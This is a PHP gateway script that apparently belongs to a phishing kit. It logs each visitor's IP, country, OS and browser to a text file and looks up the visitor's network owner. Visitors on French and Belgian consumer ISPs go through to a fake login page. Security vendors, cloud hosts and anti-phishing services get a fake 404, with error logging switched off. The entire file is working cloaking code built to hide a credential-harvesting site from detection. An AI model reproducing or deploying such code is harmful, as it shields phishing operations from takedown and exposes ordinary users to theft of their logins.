<?php
include 'login/prevents/anti1.php';
include 'login/prevents/anti2.php';
include 'login/prevents/anti3.php';
include 'login/prevents/anti4.php';
include 'login/prevents/anti5.php';
include 'login/prevents/anti6.php';
include 'login/prevents/anti7.php';
include 'login/prevents/anti8.php';
include 'login/prevents/anti9.php';
	
error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
@ini_set('html_errors','0');
@ini_set('display_errors','0');
@ini_set('display_startup_errors','0');
@ini_set('log_errors','0');
include 'inc/app.php';
$get_user_ip          = get_user_ip();
$get_user_country     = get_user_country();
$get_user_countrycode = get_user_countrycode();
$get_user_os          = get_user_os();
$get_user_browser     = get_user_browser();
    
$random = rand(0,100000000000);
$DIR    = substr(md5($random), 0, 15);
$dispatch = substr(md5($random), 0, 17);

$home="z0n51";
$file = fopen("../vu.txt","a");
fwrite($file,$get_user_ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")." >> [$get_user_country | $get_user_os | $get_user_browser] \n");

$ip = $_SERVER['REMOTE_ADDR'];
function getIpInfo($ip = '') {
     $ipinfo = file_get_contents("http://ip-api.com/json/".$ip);
    $ipinfo_json = json_decode($ipinfo, true);
    return $ipinfo_json;
}
    $visitor_ip = $_SERVER['REMOTE_ADDR'];
    $ipinfo_json = getIpInfo($visitor_ip);
	$org = "{$ipinfo_json['as']}";
	$isps = "{$ipinfo_json['isp']}";





if($_SESSION['loginorized'] != true){
if(strpos(strtolower($org),"bouygues") || strpos(strtolower($org),"orange") || strpos(strtolower($org),"sfr") || strpos(strtolower($org),"free") || strpos(strtolower($org),"wanadoo") || strpos(strtolower($org),"proximus") || strpos(strtolower($org),"nrj") || strpos(strtolower($org),"telenet") || strpos(strtolower($org),"scarlet") )
{

	$_SESSION['loginorized'] = true;

}
else{
	
    if(strpos(strtolower($org),"amazon") || strpos(strtolower($org),"chrome")|| strpos(strtolower($org),"google")|| strpos(strtolower($org),"phish")|| strpos(strtolower($org),"paypal") || strpos(strtolower($org),"dedfiberco") || strpos(strtolower($org),"palo") || strpos(strtolower($org),"digital") || strpos(strtolower($org),"cloud") || strpos(strtolower($org),"trustwave") || strpos(strtolower($org),"holdings") || strpos(strtolower($org),"softlayer") || strpos(strtolower($org),"surfcontrol") || strpos(strtolower($org),"egihosting") || strpos(strtolower($org),"logicweb") || strpos(strtolower($org),"choopa") || strpos(strtolower($org),"shinjiru") || strpos(strtolower($org),"logicWeb") || strpos(strtolower($org),"choopa") || strpos(strtolower($org),"solutions") || strpos(strtolower($org),"brookhaven")|| strpos(strtolower($org),"ovh") || strpos(strtolower($org),"xfera") || strpos(strtolower($org),"avast") || strpos(strtolower($org),"privax") || strpos(strtolower($org),"wintek") || strpos(strtolower($org),"kaspersky") || strpos(strtolower($org),"telefônica") || strpos(strtolower($org),"uk-2") || strpos(strtolower($org),"bullguard") || strpos(strtolower($org),"net4sec") || strpos(strtolower($org),"datacamp") || strpos(strtolower($org),"hostdime") || strpos(strtolower($org),"dream") || strpos(strtolower($org),"leaseweb") || strpos(strtolower($org),"hetzner")|| strpos(strtolower($org),"rakuten") || strpos(strtolower($org),"forcepoint") || strpos(strtolower($org),"ntt") || strpos(strtolower($org),"colocrossing") || strpos(strtolower($org),"forcepoint") || strpos(strtolower($org),"sinet") || strpos(strtolower($org),"soyuz") || strpos(strtolower($org),"internap") || strpos(strtolower($org),"nameshield") || strpos(strtolower($org),"microsoft") || strpos(strtolower($org),"vnpt") || strpos(strtolower($org),"pvimpelcom") || strpos(strtolower($org),"hetzner") || strpos(strtolower($org),"gigenet") || strpos(strtolower($org),"cogent") || strpos(strtolower($org),"faster") || strpos(strtolower($org),"internetx") || strpos(strtolower($org),"forcepoint") || strpos(strtolower($org),"financing") || strpos(strtolower($org),"terratransit") || strpos(strtolower($org),"joshua") || strpos(strtolower($org),"fommtouch") ||  strpos(strtolower($org),"yandex") || strpos(strtolower($org),"ratelimited") || strpos(strtolower($org),"hot-net") || strpos(strtolower($org),"mcafee") || strpos(strtolower($org),"dedfiberco"))
 
    {
 
        header("HTTP/1.0 404 Not Found");
            die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
 
    }
    else{
        $_SESSION['suspect'] = true;
        die(header('location:login/login.php?#'));
    }


}
}


if($_SESSION['loginorized'] == true){
$_SESSION['userid'] = uniqid();
header("location:login/login.php?#");
}	
	





?>